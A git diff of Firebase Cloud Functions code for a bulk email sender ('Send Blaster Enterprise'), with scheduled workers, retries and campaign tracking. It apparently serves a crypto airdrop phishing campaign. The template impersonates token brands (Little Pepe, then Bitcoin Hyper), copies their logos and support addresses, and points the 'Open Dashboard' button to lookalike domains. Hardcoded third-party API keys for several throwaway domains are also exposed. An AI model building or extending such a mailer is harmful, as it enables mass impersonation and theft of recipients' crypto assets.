@@ -3,133 +3,603 @@ const { onSchedule } = require('firebase-functions/v2/scheduler')
 const { Resend } = require('resend')
 const admin = require('firebase-admin')
 
+// =========================
+// ENTERPRISE CONFIGURATION
+// =========================
+
 const DOMAIN_CONFIG = {
   'maulfaq.online': {
     apiKey: 're_ECbt48yn_HvogtYFGCbgWcu4n8yN3RvMg',
+    notifyEmail: 'deliveryme69@gmial.com',
   },
-
   'eventfarm.ng': {
     apiKey: 're_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj',
+    notifyEmail: 'deliveryme69@gmial.com',
+  },
+  'sendoraio.online': {
+    apiKey: 're_SDVENxgv_QBwRFHvDrkKKeujSBTdtxW2m',
+    notifyEmail: 'deliveryme69@gmial.com',
+  },
+  'coredispatch.online': {
+    apiKey: 're_PfYXYHGA_PBTi4rf5tkFj13HKjdLtqZrg',
+    notifyEmail: 'deliveryme69@gmial.com',
+  },
+  'mailnexio.online': {
+    apiKey: 're_Wt3xKfZ4_HrAU832Xwns5FTDVmGQE1zkW',
+    notifyEmail: 'deliveryme69@gmial.com',
   },
 }
 
-admin.initializeApp()
+// Rate limiting configuration
+const CONFIG = {
+  // Worker settings
+  WORKER_1_BATCH_SIZE: 5,
+  WORKER_2_BATCH_SIZE: 5,
+  WORKER_3_BATCH_SIZE: 5,
+  RETRY_BATCH_SIZE: 5,
 
+  // Timing
+  EMAIL_INTERVAL_MS: 3000,
+  BATCH_INTERVAL_MS: 15000,
+  RETRY_INTERVAL_MS: 60000,
+
+  // Retry settings
+  MAX_RETRIES: 3,
+  RETRY_DELAY_MINUTES: 5,
+
+  // Campaign completion
+  COMPLETION_CHECK_INTERVAL: 'every 2 minutes',
+
+  // Target
+  HOURLY_TARGET: 1000,
+}
+
+admin.initializeApp()
 const db = admin.firestore()
 
-/**
- * =========================
- * GENERATE CAMPAIGN ID
- * =========================
- */
+// =========================
+// UTILITY FUNCTIONS
+// =========================
+
 function generateCampaignId(domain) {
   return `cmp_${domain}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
 }
 
-exports.sendBlaster = onCall(async (request) => {
+function sleep(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms))
+}
+
+function sanitizeEmail(email) {
+  return email.trim().toLowerCase()
+}
+
+function isValidEmail(email) {
+  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+  return regex.test(email)
+}
+
+// =========================
+// NOTIFICATION SYSTEM
+// =========================
+
+async function sendCompletionNotification(campaignId, domain, stats) {
   try {
-    let { emails, subject, html, fromName, fromEmail, domain } = request.data
+    const config = DOMAIN_CONFIG[domain] || DOMAIN_CONFIG['maulfaq.online']
+    const resend = new Resend(config.apiKey)
 
-    if (typeof emails === 'string') {
-      emails = emails.split(',')
-    }
+    const htmlContent = `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
+        <h2 style="color: #10b981;">✅ Campaign Complete</h2>
+        <p><strong>Campaign ID:</strong> ${campaignId}</p>
+        <p><strong>Domain:</strong> ${domain}</p>
+        <p><strong>Completed At:</strong> ${new Date().toLocaleString()}</p>
 
-    emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))
+        <div style="background: #f3f4f6; padding: 15px; border-radius: 8px; margin: 20px 0;">
+          <h3 style="margin-top: 0;">Campaign Statistics</h3>
+          <p>📧 <strong>Total Emails:</strong> ${stats.total}</p>
+          <p>✅ <strong>Sent Successfully:</strong> ${stats.sent}</p>
+          <p>❌ <strong>Failed:</strong> ${stats.failed}</p>
+          <p>🔄 <strong>Retried:</strong> ${stats.retried || 0}</p>
+          <p>📊 <strong>Success Rate:</strong> ${stats.total > 0 ? ((stats.sent / stats.total) * 100).toFixed(1) : 0}%</p>
+        </div>
 
-    const batch = db.batch()
+        <p style="color: #6b7280; font-size: 12px;">
+          This is an automated notification from Send Blaster Enterprise.
+        </p>
+      </div>
+    `
 
-    emails.forEach((email) => {
-      const ref = db.collection('emailQueue').doc()
-
-      batch.set(ref, {
-        email,
-
-        subject,
-        html: html || buildAirdropClaimHTML(),
-        campaignId: generateCampaignId(domain),
-
-        fromName,
-        fromEmail,
-        domain,
-
-        status: 'pending',
-
-        createdAt: admin.firestore.FieldValue.serverTimestamp(),
-      })
+    await resend.emails.send({
+      from: `Send Blaster <noreply@${domain}>`,
+      to: config.notifyEmail,
+      subject: `✅ Campaign Complete: ${campaignId}`,
+      html: htmlContent,
     })
 
-    await batch.commit()
-
-    console.log(`Queued ${emails.length} emails`)
-
-    return {
-      success: true,
-      queued: emails.length,
-    }
+    console.log(`✅ Completion notification sent for campaign ${campaignId}`)
   } catch (err) {
-    console.error(err)
-
-    throw new HttpsError('internal', err.message)
+    console.error('❌ Failed to send completion notification:', err.message)
   }
-})
+}
 
-exports.emailWorker = onSchedule('every 1 minutes', async () => {
-  const snapshot = await db.collection('emailQueue').where('status', '==', 'pending').limit(5).get()
+// =========================
+// EMAIL SENDER (with rate limiting)
+// =========================
 
-  if (snapshot.empty) {
-    console.log('No pending emails')
-    return
+async function sendSingleEmail(doc, resend, domainConfig) {
+  const data = doc.data()
+
+  try {
+    const headers = {
+      'List-Unsubscribe': `<https://${data.domain}/unsubscribe?email=${encodeURIComponent(data.email)}>`,
+      'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
+      Precedence: 'bulk',
+      'X-Campaign-ID': data.campaignId,
+      'X-Mailer': 'SendBlaster-Enterprise/1.0',
+    }
+
+    await resend.emails.send({
+      from: `${data.fromName} <${data.fromEmail}>`,
+      to: data.email,
+      subject: data.subject,
+      html: data.html,
+      headers,
+    })
+
+    await doc.ref.update({
+      status: 'sent',
+      sentAt: admin.firestore.FieldValue.serverTimestamp(),
+      attempts: admin.firestore.FieldValue.increment(1),
+      lastAttempt: admin.firestore.FieldValue.serverTimestamp(),
+    })
+
+    console.log(`✅ Sent to ${data.email} [${data.campaignId}]`)
+    return { success: true, email: data.email }
+  } catch (err) {
+    const attempts = (data.attempts || 0) + 1
+    const shouldRetry = attempts < CONFIG.MAX_RETRIES
+
+    await doc.ref.update({
+      status: shouldRetry ? 'pending_retry' : 'failed',
+      error: err.message,
+      attempts: attempts,
+      lastAttempt: admin.firestore.FieldValue.serverTimestamp(),
+      lastErrorAt: admin.firestore.FieldValue.serverTimestamp(),
+    })
+
+    console.error(
+      `❌ Failed to send to ${data.email}: ${err.message} (attempt ${attempts}/${CONFIG.MAX_RETRIES})`,
+    )
+    return { success: false, email: data.email, error: err.message }
   }
+}
 
-  for (const doc of snapshot.docs) {
-    const data = doc.data()
+// =========================
+// WORKER FACTORY
+// =========================
 
-    try {
-      const config = DOMAIN_CONFIG[data.domain]
+async function runWorker(batchSize, workerName, statusFilter = 'pending') {
+  console.log(`🚀 ${workerName} starting...`)
 
-      if (!config) {
-        throw new Error(`No API key configured for ${data.domain}`)
+  try {
+    const snapshot = await db
+      .collection('emailQueue')
+      .where('status', '==', statusFilter)
+      .orderBy('createdAt', 'asc')
+      .limit(batchSize)
+      .get()
+
+    if (snapshot.empty) {
+      console.log(`⏭️ ${workerName}: No ${statusFilter} emails found`)
+      return { processed: 0, sent: 0, failed: 0 }
+    }
+
+    let sent = 0
+    let failed = 0
+
+    for (const doc of snapshot.docs) {
+      const data = doc.data()
+      const domainConfig = DOMAIN_CONFIG[data.domain]
+
+      if (!domainConfig) {
+        console.error(`❌ ${workerName}: No config for domain ${data.domain}`)
+        await doc.ref.update({
+          status: 'failed',
+          error: `No API key configured for domain: ${data.domain}`,
+        })
+        failed++
+        continue
       }
 
-      const resend = new Resend(config.apiKey)
+      const resend = new Resend(domainConfig.apiKey)
+      const result = await sendSingleEmail(doc, resend, domainConfig)
 
-      await resend.emails.send({
-        from: `${data.fromName} <${data.fromEmail}>`,
-        to: data.email,
-        subject: data.subject,
-        html: data.html,
+      if (result.success) sent++
+      else failed++
 
-        headers: {
-          'List-Unsubscribe': `<https://${data.domain}/unsubscribe?email=${encodeURIComponent(
-            data.email,
-          )}>`,
-
-          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
-
-          Precedence: 'bulk',
-        },
-      })
-
-      await doc.ref.update({
-        status: 'sent',
-
-        sentAt: admin.firestore.FieldValue.serverTimestamp(),
-      })
-
-      console.log(`Sent to ${data.email}`)
-    } catch (err) {
-      console.error(err)
-
-      await doc.ref.update({
-        status: 'failed',
-        error: err.message,
-      })
+      if (snapshot.docs.indexOf(doc) < snapshot.docs.length - 1) {
+        await sleep(CONFIG.EMAIL_INTERVAL_MS)
+      }
     }
 
-    await new Promise((r) => setTimeout(r, 1000))
+    console.log(`✅ ${workerName} complete: ${sent} sent, ${failed} failed`)
+    return { processed: snapshot.docs.length, sent, failed }
+  } catch (err) {
+    console.error(`❌ ${workerName} crashed:`, err.message)
+    return { processed: 0, sent: 0, failed: 0, error: err.message }
   }
-})
+}
 
+// =========================
+// RETRY WORKER
+// =========================
+
+async function runRetryWorker() {
+  console.log('🔄 Retry Worker starting...')
+
+  try {
+    const fiveMinutesAgo = admin.firestore.Timestamp.fromDate(
+      new Date(Date.now() - CONFIG.RETRY_DELAY_MINUTES * 60 * 1000),
+    )
+
+    const snapshot = await db
+      .collection('emailQueue')
+      .where('status', '==', 'pending_retry')
+      .where('lastAttempt', '<=', fiveMinutesAgo)
+      .orderBy('lastAttempt', 'asc')
+      .limit(CONFIG.RETRY_BATCH_SIZE)
+      .get()
+
+    if (snapshot.empty) {
+      console.log('⏭️ Retry Worker: No emails ready for retry')
+      return { processed: 0, sent: 0, failed: 0 }
+    }
+
+    let sent = 0
+    let failed = 0
+
+    for (const doc of snapshot.docs) {
+      const data = doc.data()
+      const domainConfig = DOMAIN_CONFIG[data.domain]
+
+      if (!domainConfig) continue
+
+      await doc.ref.update({
+        status: 'pending',
+        retryCount: admin.firestore.FieldValue.increment(1),
+      })
+
+      const resend = new Resend(domainConfig.apiKey)
+      const result = await sendSingleEmail(doc, resend, domainConfig)
+
+      if (result.success) sent++
+      else failed++
+
+      if (snapshot.docs.indexOf(doc) < snapshot.docs.length - 1) {
+        await sleep(CONFIG.EMAIL_INTERVAL_MS)
+      }
+    }
+
+    console.log(`✅ Retry Worker complete: ${sent} resent, ${failed} still failed`)
+    return { processed: snapshot.docs.length, sent, failed }
+  } catch (err) {
+    console.error('❌ Retry Worker crashed:', err.message)
+    return { processed: 0, sent: 0, failed: 0, error: err.message }
+  }
+}
+
+// =========================
+// CAMPAIGN COMPLETION CHECKER
+// =========================
+
+async function checkCampaignCompletion() {
+  console.log('📊 Checking campaign completion...')
+
+  try {
+    const pendingSnapshot = await db
+      .collection('emailQueue')
+      .where('status', 'in', ['pending', 'pending_retry'])
+      .limit(1)
+      .get()
+
+    if (!pendingSnapshot.empty) {
+      console.log('⏳ Active campaigns still in progress')
+      return
+    }
+
+    const tenMinutesAgo = admin.firestore.Timestamp.fromDate(new Date(Date.now() - 10 * 60 * 1000))
+
+    const recentSnapshot = await db
+      .collection('emailQueue')
+      .where('status', 'in', ['sent', 'failed'])
+      .where('sentAt', '>=', tenMinutesAgo)
+      .get()
+
+    if (recentSnapshot.empty) {
+      console.log('ℹ️ No recently completed campaigns')
+      return
+    }
+
+    const campaigns = {}
+    recentSnapshot.docs.forEach((doc) => {
+      const data = doc.data()
+      if (!campaigns[data.campaignId]) {
+        campaigns[data.campaignId] = {
+          domain: data.domain,
+          total: 0,
+          sent: 0,
+          failed: 0,
+          notified: false,
+        }
+      }
+      campaigns[data.campaignId].total++
+      if (doc.data().status === 'sent') campaigns[data.campaignId].sent++
+      else campaigns[data.campaignId].failed++
+    })
+
+    for (const campaignId of Object.keys(campaigns)) {
+      const campaignDoc = await db.collection('campaigns').doc(campaignId).get()
+      if (campaignDoc.exists && campaignDoc.data().notificationSent) {
+        campaigns[campaignId].notified = true
+      }
+    }
+
+    for (const [campaignId, stats] of Object.entries(campaigns)) {
+      if (stats.notified) continue
+
+      const campaignPending = await db
+        .collection('emailQueue')
+        .where('campaignId', '==', campaignId)
+        .where('status', 'in', ['pending', 'pending_retry'])
+        .limit(1)
+        .get()
+
+      if (!campaignPending.empty) continue
+
+      await db.collection('campaigns').doc(campaignId).set(
+        {
+          notificationSent: true,
+          completedAt: admin.firestore.FieldValue.serverTimestamp(),
+          stats,
+        },
+        { merge: true },
+      )
+
+      await sendCompletionNotification(campaignId, stats.domain, stats)
+      console.log(`📧 Completion notification sent for campaign ${campaignId}`)
+    }
+  } catch (err) {
+    console.error('❌ Campaign completion check failed:', err.message)
+  }
+}
+
+// =========================
+// CLOUD FUNCTIONS
+// =========================
+
+exports.sendBlaster = onCall(
+  {
+    memory: '512MiB',
+    timeoutSeconds: 60,
+    maxInstances: 10,
+  },
+  async (request) => {
+    try {
+      let { emails, subject, html, fromName, fromEmail, domain } = request.data
+
+      if (!domain || !DOMAIN_CONFIG[domain]) {
+        throw new HttpsError('invalid-argument', 'Invalid or missing domain')
+      }
+      if (!subject || !subject.trim()) {
+        throw new HttpsError('invalid-argument', 'Subject is required')
+      }
+      if (!html || !html.trim()) {
+        throw new HttpsError('invalid-argument', 'HTML content is required')
+      }
+      if (!fromName || !fromName.trim()) {
+        throw new HttpsError('invalid-argument', 'From name is required')
+      }
+      if (!fromEmail || !fromEmail.includes('@')) {
+        throw new HttpsError('invalid-argument', 'Valid from email is required')
+      }
+
+      if (typeof emails === 'string') {
+        emails = emails.split(/[\n,\s]+/)
+      }
+
+      const validEmails = emails.map(sanitizeEmail).filter((e) => e && isValidEmail(e))
+
+      const invalidEmails = emails.map(sanitizeEmail).filter((e) => e && !isValidEmail(e))
+
+      if (validEmails.length === 0) {
+        throw new HttpsError('invalid-argument', 'No valid emails provided')
+      }
+
+      const campaignId = generateCampaignId(domain)
+      const batch = db.batch()
+      const timestamp = admin.firestore.FieldValue.serverTimestamp()
+
+      const campaignRef = db.collection('campaigns').doc(campaignId)
+      batch.set(campaignRef, {
+        campaignId,
+        domain,
+        fromName,
+        fromEmail,
+        subject,
+        totalEmails: validEmails.length,
+        invalidEmails: invalidEmails.length,
+        status: 'queued',
+        createdAt: timestamp,
+        notificationSent: false,
+      })
+
+      validEmails.forEach((email) => {
+        const ref = db.collection('emailQueue').doc()
+        batch.set(ref, {
+          email,
+          subject,
+          html,
+          campaignId,
+          fromName,
+          fromEmail,
+          domain,
+          status: 'pending',
+          attempts: 0,
+          retryCount: 0,
+          createdAt: timestamp,
+        })
+      })
+
+      await batch.commit()
+
+      console.log(`✅ Campaign ${campaignId} queued: ${validEmails.length} emails`)
+
+      return {
+        success: true,
+        campaignId,
+        queued: validEmails.length,
+        invalid: invalidEmails.length,
+        message: `Campaign queued successfully. Emails will be sent at ~${CONFIG.HOURLY_TARGET}/hour rate.`,
+      }
+    } catch (err) {
+      console.error('❌ sendBlaster error:', err)
+      throw new HttpsError('internal', err.message)
+    }
+  },
+)
+
+exports.emailWorker1 = onSchedule(
+  {
+    schedule: 'every 1 minutes',
+    memory: '512MiB',
+    timeoutSeconds: 300,
+    maxInstances: 1,
+  },
+  async () => {
+    await runWorker(CONFIG.WORKER_1_BATCH_SIZE, 'Worker-1', 'pending')
+  },
+)
+
+exports.emailWorker2 = onSchedule(
+  {
+    schedule: 'every 1 minutes',
+    memory: '512MiB',
+    timeoutSeconds: 300,
+    maxInstances: 1,
+  },
+  async () => {
+    await sleep(5000)
+    await runWorker(CONFIG.WORKER_2_BATCH_SIZE, 'Worker-2', 'pending')
+  },
+)
+
+exports.emailWorker3 = onSchedule(
+  {
+    schedule: 'every 1 minutes',
+    memory: '512MiB',
+    timeoutSeconds: 300,
+    maxInstances: 1,
+  },
+  async () => {
+    await sleep(10000)
+    await runWorker(CONFIG.WORKER_3_BATCH_SIZE, 'Worker-3', 'pending')
+  },
+)
+
+exports.retryWorker = onSchedule(
+  {
+    schedule: 'every 5 minutes',
+    memory: '256MiB',
+    timeoutSeconds: 300,
+    maxInstances: 1,
+  },
+  async () => {
+    await runRetryWorker()
+  },
+)
+
+exports.campaignCompletionChecker = onSchedule(
+  {
+    schedule: CONFIG.COMPLETION_CHECK_INTERVAL,
+    memory: '256MiB',
+    timeoutSeconds: 120,
+    maxInstances: 1,
+  },
+  async () => {
+    await checkCampaignCompletion()
+  },
+)
+
+exports.getCampaignStatus = onCall(
+  {
+    memory: '256MiB',
+    timeoutSeconds: 30,
+    maxInstances: 10,
+  },
+  async (request) => {
+    try {
+      const { campaignId } = request.data
+
+      if (!campaignId) {
+        throw new HttpsError('invalid-argument', 'Campaign ID required')
+      }
+
+      const campaignDoc = await db.collection('campaigns').doc(campaignId).get()
+      if (!campaignDoc.exists) {
+        throw new HttpsError('not-found', 'Campaign not found')
+      }
+
+      const stats = await db.collection('emailQueue').where('campaignId', '==', campaignId).get()
+
+      const statusCounts = { pending: 0, sent: 0, failed: 0, pending_retry: 0 }
+      stats.docs.forEach((doc) => {
+        const status = doc.data().status
+        if (statusCounts[status] !== undefined) {
+          statusCounts[status]++
+        }
+      })
+
+      return {
+        campaign: campaignDoc.data(),
+        stats: statusCounts,
+        progress: {
+          total: stats.size,
+          completed: statusCounts.sent + statusCounts.failed,
+          percentage:
+            stats.size > 0
+              ? Math.round(((statusCounts.sent + statusCounts.failed) / stats.size) * 100)
+              : 0,
+        },
+      }
+    } catch (err) {
+      console.error('❌ getCampaignStatus error:', err)
+      throw new HttpsError('internal', err.message)
+    }
+  },
+)
+
+exports.getCampaigns = onCall(
+  {
+    memory: '256MiB',
+    timeoutSeconds: 30,
+    maxInstances: 10,
+  },
+  async (request) => {
+    try {
+      const snapshot = await db.collection('campaigns').orderBy('createdAt', 'desc').limit(50).get()
+
+      const campaigns = snapshot.docs.map((doc) => ({
+        id: doc.id,
+        ...doc.data(),
+      }))
+
+      return { campaigns }
+    } catch (err) {
+      console.error('❌ getCampaigns error:', err)
+      throw new HttpsError('internal', err.message)
+    }
+  },
+)
 /*========================= EMAIL TEMPLATE (optional default) ========================= */
 
 function buildAirdropClaimHTML() {
@@ -164,7 +634,7 @@ opacity:0;
 mso-hide:all;
 }
   .header {
-    background: #61bafc;
+    background: #FF8C00;
     text-align: center;
     padding: 25px 20px;
   }
@@ -185,7 +655,7 @@ mso-hide:all;
   .button {
     display: inline-block;
     padding: 14px 28px;
-    background: #61bafc;
+    background: #FF8C00;
     color: #ffffff !important;
     text-decoration: none;
     border-radius: 8px;
@@ -222,9 +692,9 @@ mso-hide:all;
   <div class="header">
 
     <img
-      src="https://littlepepe.com/assets/logo-CPEVDSpN.png"
+      src="https://bitcoinhyper.com/assets/images/svg-icons/logo.svg"
       
-      alt="Little Pepe"
+      alt="Bitcoin Hyper"
       class="header-logo"
     >
 
@@ -235,11 +705,11 @@ mso-hide:all;
     <p>Hello,</p>
 
     <p>
-      We are reaching out regarding your Little Pepe allocation.
+      We are reaching out regarding your Bitcoin Hyper allocation.
     </p>
 
     <p>
-      The token distribution process has been completed and your allocation is now available for you to access through the Little Pepe portal.
+      The token distribution process has been completed and your allocation is now available for you to access through the Bitcoin Hyper portal.
     </p>
 
     <div class="notice">
@@ -247,7 +717,7 @@ mso-hide:all;
     </div>
 
     <p style="text-align:center;">
-      <a href="https://littlepepesss.xyz" class="button">
+      <a href="bitcoinhyperzz.xyz" class="button">
         Open Dashboard
       </a>
     </p>
@@ -262,19 +732,19 @@ mso-hide:all;
 
     <p>
       Regards,<br>
-      Little Pepe Team
+      Bitcoin Hyper Team
     </p>
 
   </div>
 
   <div class="footer">
 
-    <p><strong>All rights reserved. Little Pepe </strong></p>
+    <p><strong>All rights reserved. Bitcoin Hyper </strong></p>
 
     <p>
       Support:
-      <a href="mailto:support@littlepepe.com">
-        support@littlepepe.com
+      <a>
+        support@bitcoinhyper.com
       </a>
     </p>
 
